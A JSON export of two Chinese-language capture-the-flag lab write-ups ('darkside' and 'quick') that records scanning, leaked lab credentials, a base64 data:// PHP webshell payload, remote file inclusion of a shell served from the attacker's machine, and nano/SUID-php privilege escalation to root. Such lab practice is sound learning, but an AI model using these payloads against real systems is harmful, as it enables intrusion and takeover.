[{"title":"darkside","path":"/2025/07/07/darkside/","content":"darkside 靶机ip: 192.168.1.97 攻击机ip: 192.168.1.93 信息收集(base) Downloads nmap -sC -sV -p- 192.168.1.97Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 18:05 CSTNmap scan report for 192.168.1.97Host is up (0.0050s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)| ssh-hostkey:| 3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)| 256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)|_ 256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)80/tcp open http Apache httpd 2.4.56 ((Debian))|_http-title: The DarkSide| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.56 (Debian)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds (pwncat) ➜ Downloads feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,md -u http://192.168.1.97 -C 404 -d 1 ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben epi Risher 🤓 ver: 2.11.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.1.97 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 💢 Status Code Filters │ [404] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.11.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [php, html, txt, bak, md] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────404 GET 9l 31w 274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter403 GET 9l 28w 277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200 GET 29l 45w 683c http://192.168.1.97/index.php200 GET 74l 300w 2121c http://192.168.1.97/styles.css200 GET 29l 45w 683c http://192.168.1.97/301 GET 9l 28w 313c http://192.168.1.97/backup = http://192.168.1.97/backup/ (base) Downloads curl http://192.168.1.97/backup/vote.txtrijaba: Yesxerosec: Yessml: Nocromiphi: Nogatogamer: Nochema: Yestalleyrand: Nod3b0o: YesSince the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin. (base) Downloads curl http://192.168.1.97/backup/vote.txt vote.txt % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 205 100 205 0 0 4191 0 --:--:-- --:--:-- --:--:-- 4270(base) Downloads cat vote.txt | awk -F : print $1 | grep -Ev ^$ | grep -Ev Since* user.txt(base) Downloads echo kevin user.txt 后台密码爆破这里跑的太慢了，最后看wp找密码 kevin/iloveyou 解密出来是 sfqekmgncutjhbypvxda.onion 修改Cookie 最终获得 kevin:ILoveCalisthenics kevin@darkside:~$ ls -altotal 32drwxr-xr-x 3 kevin kevin 4096 Oct 30 2023 .drwxr-xr-x 4 root root 4096 Oct 15 2023 ..lrwxrwxrwx 1 kevin kevin 9 Oct 30 2023 .bash_history - /dev/null-rw-r--r-- 1 kevin kevin 220 Oct 15 2023 .bash_logout-rw-r--r-- 1 kevin kevin 3526 Oct 15 2023 .bashrc-rw-r--r-- 1 kevin kevin 113 Oct 15 2023 .historydrwxr-xr-x 3 kevin kevin 4096 Oct 15 2023 .local-rw-r--r-- 1 kevin kevin 807 Oct 15 2023 .profile-rw-r--r-- 1 kevin kevin 19 Oct 15 2023 user.txtkevin@darkside:~$ cat .historyls -alhostname -Iecho Congratulations on the OSCP Xerosectopps -fauxsu rijabaILoveJabitals /home/rijabakevin@darkside:~$ su - rijabaPassword:rijaba@darkside:~$ nano提权rijaba@darkside:~$ sudo -lMatching Defaults entries for rijaba on darkside: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser rijaba may run the following commands on darkside: (root) NOPASSWD: /usr/bin/nanorijaba@darkside:~$ nano^R^Xreset; bash 10 20","tags":["后台密码爆破","nano提权"]},{"title":"quick","path":"/2025/06/11/quick/","content":"使用fscan扫描发现开启了80端口，访问页面 点击下面的Home、Cars等会出现参数?page=xxxx，猜测有文件包含，但是使用php伪协议没有包含成功，尝试远程包含，本机开启服务器 echo test 1.phppython -m http.server 8089 发现成功访问了我的http服务器上的1.php 漏洞利用data:伪协议可以直接传数据，不用包含远程服务器上的文件 ?php system($_POST[1]);? =data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4= 远程文件包含法在攻击机启动一个http服务器 python -m http.server 8089 服务器上写一个shell.php ?phpsystem($_POST[1]);? 因为这里代码应该是$filename . .php的类型，要过滤后面的.php可以在后面使用?和# 使用配置 php提权尝试suid提权 find / -perm -4000 -type f 2/dev/null 发现php7.0具有suid权限,但是在蚁剑终端里面不能提权，反弹shell出来 然后使用命令 cd /usr/binCMD=/bin/sh./php7.0 -r pcntl_exec(/bin/sh, [-p]);","tags":["data伪协议","远程文件包含","php提权"]}]